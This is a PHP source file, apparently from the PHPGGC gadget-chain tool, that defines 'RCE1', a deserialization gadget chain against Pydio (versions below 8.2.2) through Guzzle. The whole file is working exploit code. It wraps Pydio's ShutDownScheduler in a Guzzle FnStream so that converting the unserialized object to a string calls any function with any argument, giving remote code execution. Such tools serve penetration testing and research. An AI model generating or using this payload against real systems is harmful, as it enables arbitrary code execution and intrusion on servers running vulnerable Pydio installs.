<?php

namespace GadgetChain\Pydio\Guzzle;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
  public static $version = '< 8.2.2';
  public static $vector = '__toString';
  public static $author = 'us3r777';

  public function generate(array $parameters)
  {
    $function = $parameters['function'];
    $parameter = $parameters['parameter'];

    return new \GuzzleHttp\Psr7\FnStream([
        '__toString' => [ new \Pydio\Core\Controller\ShutDownScheduler($function, $parameter), 'callRegisteredShutdown']
    ]);
  }   
} 
